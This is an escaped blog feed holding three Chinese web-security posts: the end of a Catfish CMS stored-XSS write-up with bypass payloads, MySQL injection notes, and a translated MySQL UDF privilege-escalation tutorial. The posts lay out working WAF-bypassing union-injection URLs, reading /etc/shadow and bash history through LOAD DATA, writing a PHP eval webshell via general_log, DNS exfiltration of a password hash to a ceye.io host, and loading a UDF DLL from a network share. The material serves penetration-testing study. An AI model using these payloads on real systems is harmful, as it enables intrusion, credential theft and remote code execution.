    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;stripos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;script'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;stripos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;style'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;stripos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;iframe'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;stripos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;frame'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;stripos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'onclick'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;preg_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/&amp;lt;script[\s\S]*?&amp;lt;\/script[\s]*&amp;gt;/i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/&amp;lt;style[\s\S]*?&amp;lt;\/style[\s]*&amp;gt;/i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/&amp;lt;iframe[\s\S]*?[&amp;lt;\/iframe|\/][\s]*&amp;gt;/i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/&amp;lt;frame[\s\S]*?[&amp;lt;\/frame|\/][\s]*&amp;gt;/i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/on[A-Za-z]+[\s]*=[\s]*[\'|&quot;][\s\S]*?[\'|&quot;]/i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;正则有问题。
列举2个绕过payload&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onerror=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;alert(1)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; 
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onmouseover=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:alert(1);&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;M&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;验证&quot;&gt;验证&lt;/h3&gt;

&lt;p&gt;注册用户登陆，对文章评论
&lt;img src=&quot;https://xzfile.aliyuncs.com/media/upload/picture/20180408213625-d5462f04-3b31-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;提交评论抓包改为&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://xzfile.aliyuncs.com/media/upload/picture/20180408213625-d5611116-3b31-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;浏览文章或管理员登陆后台可触发
&lt;img src=&quot;https://xzfile.aliyuncs.com/media/upload/picture/20180408213625-d57f5662-3b31-1.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://xzfile.aliyuncs.com/media/upload/picture/20180408213625-d59401ac-3b31-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="Web安全" /><summary type="html">本文首发 先知社区 Catfish(鲶鱼) CMS V 4.7.21 存储型XSS漏洞 Catfish(鲶鱼) CMS 开源免费的PHP内容管理系统 不需要高深专业技术轻松搭建网站 使用简单　灵活方便　稳定快捷 风格切换　想换就换　适应不同需求 最新版本：V 4.7.21 http://www.catfish-cms.com/</summary></entry><entry><title type="html">mysql小记</title><link href="http://localhost:4000/mysql%E5%B0%8F%E8%AE%B0/" rel="alternate" type="text/html" title="mysql小记" /><published>2018-04-05T04:50:30-04:00</published><updated>2018-04-05T04:50:30-04:00</updated><id>http://localhost:4000/mysql%E5%B0%8F%E8%AE%B0</id><content type="html" xml:base="http://localhost:4000/mysql%E5%B0%8F%E8%AE%B0/">&lt;blockquote&gt;
  &lt;p&gt;不管你是在研究什么事物，还是在思考任何观点，请只问你自己‘事实是什么’以及事实所证实的真理是什么。永远不要让自己被自己所更愿意相信的，或你认为人们相信了之后会对社会更加有益的东西所影响，只是简单的去审视，什么才是事实。–罗素&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;sql-bypass-dog&quot;&gt;sql Bypass dog&lt;/h2&gt;
&lt;h3 id=&quot;步骤&quot;&gt;步骤&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;测试是否存在&lt;/p&gt;

&lt;p&gt;and 1=1 绕过 %26%26 1 like 1  %26%26 1 in(1)&lt;/p&gt;

&lt;p&gt;通常 order by 不会拦截&lt;/p&gt;

&lt;p&gt;order by组合中间有空格才拦截，空格替换 /**/ 直接绕过&lt;/p&gt;

&lt;p&gt;/&lt;em&gt;!order&lt;/em&gt;/by 2   order%23%0aby 1&lt;/p&gt;

&lt;p&gt;/**/被拦  中间加字母与 ‘ ; [] ~ 等&lt;/p&gt;

&lt;p&gt;asp允许在每个字符前加% 如 union sel%ect&lt;/p&gt;

&lt;p&gt;参数污染
&lt;img src=&quot;https://raw.githubusercontent.com/tom0li/tom0li.github.io/master/images/mysql1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;以下最新测试union可以bypass-dog201841&quot;&gt;以下最新测试union可以Bypass dog(2018.4.1)&lt;/h3&gt;
&lt;hr /&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	原始语句
	select user()
	查user Bypass
	http://127.0.0.1/2.php?id=1/*!union/*!/*!*//*!select/*!/*!*//*!user/*!/*!()*/,2    
	查database
	http://127.0.0.1/2.php?id=1/*!union/*!/*!/*!select/*!/*!*//*!user/*!/*!/*!/*!()*/,/*!/*!/*!database/*!/*!/*!/*!()*/
	查表名
	union select group_concat(table_name) ,NULL from information_schema.tables where table_schema=database() 
	http://127.0.0.1/2.php?id=1/*!/*!/*!/*!UNION/*!/*!*//*!/*!/*!SELECT/*!/*!*//*!group_concat(table_name)/*!/*!*/,NULL/*!from/*!/*!*//*!information_schema.tables/*!/*!*//*!where/*!/*!*//*!table_schema=/*!/*!*//*!database/*!/*!()*/
	union select group_concat(column_name) ,NULL from information_schema.columns where table_name = &quot;&quot;
	查列名
	http://127.0.0.1/2.php?id=1/*!/*!/*!/*!UNION/*!/*!*//*!/*!/*!SELECT/*!/*!*//*!group_concat(column_name)/*!/*!*/,NULL/*!from/*!/*!*//*!information_schema.columns/*!/*!*//*!where/*!/*!*//*!table_name=&quot;&quot;*/
	查值
	http://127.0.0.1/2.php?id=1/*!/*!/*!/*!UNION/*!/*!*//*!/*!/*!SELECT/*!/*!*//*!group_concat(concat(id,0x2c,content))/*!/*!*/,NULL/*!from/*!/*!table*/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;group_concat与concat区别
&lt;img src=&quot;https://raw.githubusercontent.com/tom0li/tom0li.github.io/master/img/mysql2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;fuzz&quot;&gt;FUZZ&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;借用从容大牛观点
以下[]为fuzz点。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select * from data where id=1 [] union [] select [] pwd [] from [] pwd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;innodb_table_stats查表&quot;&gt;innodb_table_stats查表&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;innodb从5.5开始成为默认引擎
mysql 5.6有mysql库中有innodb_index_stats，innodb_table_stats表，
innodb_index_stats存储着innodb引擎的库名，表名，对应索引
innodb_table_stats存储着innodb引擎的库名，表名
以下payload可查表名，&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select table_name from mysql.innodb_table_stats where database_name = database()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;低权限读文件&quot;&gt;低权限读文件&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;如果没有权限，mysql还有个低权限读文件漏洞，/etc/shadow /root/.bash_history都可以读出来。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MYSQL 5.5.53
drop table mysql.m1
CREATE TABLE mysql.m1 (code TEXT );
LOAD DATA LOCAL INFILE '/root/.bash_history' INTO TABLE mysql.m1 fields terminated by ''
select * from mysql.m1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;mysql主键重复报错原理&quot;&gt;mysql主键重复报错原理&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;rand&amp;amp;group by&amp;amp;count缺一不可&lt;br /&gt;
rand(0)每次查询一样&lt;br /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/tom0li/tom0li.github.io/master/images/mysql3.png&quot; alt=&quot;&quot; /&gt; 
floor(rand(0)*2)取整如下&lt;br /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/tom0li/tom0li.github.io/master/images/mysql4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;select count(&lt;em&gt;) from runoob group by floor(rand(0)&lt;/em&gt;2);&lt;br /&gt;
floor(rand(0)*2)计算结果为 011011…&lt;br /&gt;
在使用group by时，查询有rand()会被执行多次，如果建的虚表中不存在，则在再次执行。&lt;br /&gt;
查询流程:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;建立虚表&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;key | count(*)
—- | —-&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;执行floor(rand(0)*2) 为0表中没，再次执行结果为1插入&lt;/li&gt;
&lt;/ol&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;key&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;count(*)&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ol&gt;
  &lt;li&gt;第一次计算为1，不进行2次计算，count(*)+1&lt;/li&gt;
&lt;/ol&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;key&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;count(*)&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ol&gt;
  &lt;li&gt;计算为0，没有0，尝试插入，在插入时再次计算结果作为虚表主键，值为1冲突。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;mysql写shell&quot;&gt;mysql写shell&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;5.5，5.7通过log写。&lt;/p&gt;

&lt;p&gt;小于5.5且secure_file_priv不为NULL,通过load_file() into dumpfile写。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2167&quot;&gt;udf提权&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;原因&quot;&gt;原因&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;secure_file_priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。&lt;/p&gt;

&lt;p&gt;MySQL5.5版本：my.ini中无此参数，查询该参数情况为NULL&lt;/p&gt;

&lt;p&gt;MySQL5.6版本：my.ini中无此参数，查询该参数情况为空&lt;/p&gt;

&lt;p&gt;MySQL5.7版本：my.ini中有此参数，查询该参数情况为数据目录下的Upload文件夹&lt;/p&gt;

&lt;p&gt;通过show variables like ‘%secure%’;查看参数情况，参数可在my.ini中改，重启生效。&lt;/p&gt;

&lt;h3 id=&quot;dumpfile和oufile区别&quot;&gt;dumpfile和oufile区别&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;into outfile 函数会在行末端写入新行，是会转义换行符&lt;/p&gt;

&lt;p&gt;这样的话这个2进制可执行文件就会被破坏，即格式化的数据。&lt;/p&gt;

&lt;p&gt;into dumpfile 就能导出一个完整能执行的2进制文件&lt;/p&gt;

&lt;p&gt;udf提权5.5版本默认没plugin目录，使用NTFS的ADS流创建(试了没成功)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select 'aa' into dumpfile 'C:\\phpStudy\\PHPTutorial\\MySQL\\plugin::$INDEX_ALLOCATION';		//利用NTFS ADS创建plugin目录  
select 'aa' into dumpfile 'C:\\phpStudy\\PHPTutorial\\MySQL\\lib::$INDEX_ALLOCATION';    //利用NTFS ADS创建lib目录  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;通过general_log，general_log_file写shell。&lt;/p&gt;

&lt;p&gt;置general为ON，general_log_file记录执行语句，执行包含的payload即可.&lt;/p&gt;

&lt;p&gt;具体过程如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;show variables like '%general%';查看默认日志位置
set global general_log = on;
set global general_log_file = 'C:/Program Files (x86)/Apache Software Foundation/Apache2.2/htdocs/abouts.php'; 指定为目标网站的物理路径
select '&amp;lt;?php eval($_POST[aaa]);?&amp;gt;'; 写shell
还原：
set global general_log_file = 'C:\ProgramData\MySQL\MySQL Server 5.5\Data\2018R2DC.log';
set global general_log = off;  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;sql-oob&quot;&gt;sql OOB&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/tom0li/tom0li.github.io/master/images/mysql5.png&quot; alt=&quot;&quot; /&gt;
原理：dns查询带出数据&lt;/p&gt;

&lt;p&gt;win利用&lt;/p&gt;

&lt;p&gt;UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。CONCAT()函数4个\，因为转义的原因，4个就变\成了2个\，目的就是利用UNC路径。&lt;/p&gt;

&lt;p&gt;payload&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	select load_file(CONCAT('\\\\',(SELECT hex(pass) 
	FROM test WHERE name='admin'),'.uudjoj.ceye.io\\ff'))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Dnslog平台http://ceye.io&lt;/p&gt;</content><author><name></name></author><category term="Web安全" /><summary type="html">不管你是在研究什么事物，还是在思考任何观点，请只问你自己‘事实是什么’以及事实所证实的真理是什么。永远不要让自己被自己所更愿意相信的，或你认为人们相信了之后会对社会更加有益的东西所影响，只是简单的去审视，什么才是事实。–罗素</summary></entry><entry><title type="html">翻译 mysql udf提权</title><link href="http://localhost:4000/udf/" rel="alternate" type="text/html" title="翻译 mysql udf提权" /><published>2018-03-15T04:50:30-04:00</published><updated>2018-03-15T04:50:30-04:00</updated><id>http://localhost:4000/udf</id><content type="html" xml:base="http://localhost:4000/udf/">&lt;p&gt;本文首发先知社区，如需转载请联系&lt;a href=&quot;https://xianzhi.aliyun.com/forum/topic/2167&quot;&gt;先知社区&lt;/a&gt;
原文地址https://osandamalith.com/2018/02/11/mysql-udf-exploitation/&lt;/p&gt;
&lt;h2 id=&quot;综述&quot;&gt;综述&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;在现实世界中，当我登录金融机构时，遇到了他们的内网并且使用MySQL 5.7 64位作为后端数据库的场景。大多数时候，我在环境中遇到MSSQL，这是一种罕见的情况（mysql）。我在Web应用程序中发现了SQL注入，并且能够从mysql.user dump用户名和密码我意识到它有权将文件写入磁盘。这使我写了一篇文章，分享关于向MySQL写入udf.dll，使之代码执行和在Windows中弹出一个shell的技巧。当我在谷歌搜索大多数的技术文章，当涉及到Windows，文章解释的不太清楚。所以，我想用我自己的研究来写这篇文章来使之更加清楚，并让你了解一些手工使用的技巧。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;当我在一台主机上写博客时，我将使用最新的MySQL 5.7.21服务器。为了重现该场景，我运行mysqld服务器，并将带有’-secure-file-priv =’参数的设置为blank（不是NULL）。在这种情况下，我能够在内网使用中union注入，从mysql.user表中检索用户名和密码。请注意，在MySQL 5.7及更高版本中，“password”列不存在。他们已将其更改为’authentication_string’。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	＃MySQL 5.6及以下版本
	select host, user, password from mysql.user;
	＃MySQL 5.7及以上版本
	select host, user, authentication_string from mysql.user; ![](https://osandamalith.files.wordpress.com/2018/02/1-intranet.png)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;请注意，如果您已拥有credentials，则可以使用metasploit的mysql_hashdump.rb auxiliary module 来dump MySQL哈希值。当我写这篇博文时，脚本需要更新以便在MySQL 5.7中兼容，您可以在这里查看我的&lt;a href=&quot;https://github.com/rapid7/metasploit-framework/pull/9525&quot;&gt;pull&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;用户’osanda’的主机列允许来自192.168.0.*的连接，这意味着我们可以使用该用户从该IP范围进行远程连接。我破解了密码哈希并获得了明文密码。
&lt;img src=&quot;https://osandamalith.files.wordpress.com/2018/02/loggin-in.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;登录到MySQL后，我查看了当前用户的权限。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	select * from mysql.user where user = substring_index(user(), '@', 1) ; ![](https://osandamalith.files.wordpress.com/2018/02/privs-of-osanda.png) 我们登录的用户拥有所有权限，并且我们有权读取和写入文件，您可以在其中考虑编写UDF DLL库并获得代码执行。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;什么是udf库&quot;&gt;什么是UDF库&lt;/h2&gt;
&lt;p&gt;UDF表示MySQL中的用户定义函数。这就像在DLL中编写自己的函数并在MySQL中调用它们一样。我们将使用可在Metasploit框架中找到的“lib_mysqludf_sys_64.dll”DLL库。您可以使用基于系统架构的UDF库，位置在 Metasploit”/usr/share/metasploit-framework/data/exploits/mysql/”&lt;a href=&quot;https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql&quot;&gt;点击这里查看文件的github链接&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;首先，我们必须检查运行MySQL的版本。全局变量’@@ version_compile_os’向我们展示了MySQL结构，’@@ version_compile_machine’向我们展示了操作系统的结构。在这种情况下，我们在64位Windows操作系统中运行64位版本的MySQL。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MySQL [(none)]&amp;gt; select @@version_compile_os, @@version_compile_machine;
+----------------------+---------------------------+
| @@version_compile_os | @@version_compile_machine |
+----------------------+---------------------------+
| Win64                | x86_64                    |
+----------------------+---------------------------+
MySQL [(none)]&amp;gt; show variables like '%compile%';
+-------------------------+--------+
| Variable_name           | Value  |
+-------------------------+--------+
| version_compile_machine | x86_64 |
| version_compile_os      | Win64  |
+-------------------------+--------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://osandamalith.files.wordpress.com/2018/02/compile-os.png&quot; alt=&quot;&quot; /&gt;
从MySQL 5.0.67开始，UDF库必须包含在plugin文件夹中，可以使用’@@ plugin_dir’全局变量找到它。这个变量可以在mysql.ini文件中看到和编辑。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MySQL [(none)]&amp;gt; select @@plugin_dir ;
+--------------------------------------------------------------+
| @@plugin_dir                                                 |
+--------------------------------------------------------------+
| D:\MySQL\mysql-5.7.21-winx64\mysql-5.7.21-winx64\lib\plugin\ |
+--------------------------------------------------------------+
1 row in set (0.02 sec)

MySQL [(none)]&amp;gt; show variables like 'plugin%';
+---------------+--------------------------------------------------------------+
| Variable_name | Value                                                        |
+---------------+--------------------------------------------------------------+
| plugin_dir    | D:\MySQL\mysql-5.7.21-winx64\mysql-5.7.21-winx64\lib\plugin\ |
+---------------+---------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://osandamalith.files.wordpress.com/2018/02/plugin.png&quot; alt=&quot;&quot; /&gt;
您可以通过将新值传递给mysqld来更改插件目录变量。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysqld.exe –plugin-dir=C:\\temp\\plugins\\
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;另一种方法是用plugin目录编写一个新的mysql配置文件并将其传递给mysqld。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysqld.exe --defaults-file=C:\\temp\\my.ini
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The content of the ‘my.ini’&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-[mysqld]&quot;&gt;plugin_dir = C:\\temp\\plugins\\
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从MySQL 5.0.67开始，文件必须位于plugin目录中。该目录取决于plugin_dir系统变量的值。如果plugin_dir的值为空，则参照5.0.67之前即文件必须位于系统动态链接器的搜索目录中。
在5.0.67之前的MySQL版本中， the file must be in a directory that is searched by your system’s dynamic linker。这同样适用于4.1.25之前的MySQL版本.
5.0&amp;lt;=mysql&amp;lt;5.0.67，则需要导出至目标服务器的系统目录（如：system32）
在旧版本中，您可以将DLL文件上传到以下位置并创建新的UDF功能。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@@ DATADIR
@@ BASEDIR \ BIN
C：\ WINDOWS
C：\ WINDOWS \ SYSTEM
C：\ WINDOWS \ SYSTEM32
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;上传二进制文件&quot;&gt;上传二进制文件&lt;/h3&gt;
&lt;p&gt;有很多可能的方法可以做到这一点。load_file函数支持网络路径。如果您可以将DLL复制到网络共享中，您可以直接加载它并写入磁盘。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select load_file('\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll') into dumpfile &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;另一种方法是用一个十六进制编码的字符串将整个DLL文件写入磁盘。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select hex(load_file('/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll')) into dumpfile '/tmp/udf.hex';

select 0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000000… into dump file &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;另一种方法是创建一个表并将二进制数据插入到十六进制编码流中。您可以尝试在一个插入语句中编写代码或将其分解为多个部分，其中使用update语句来联系二进制数据&lt;/p&gt;
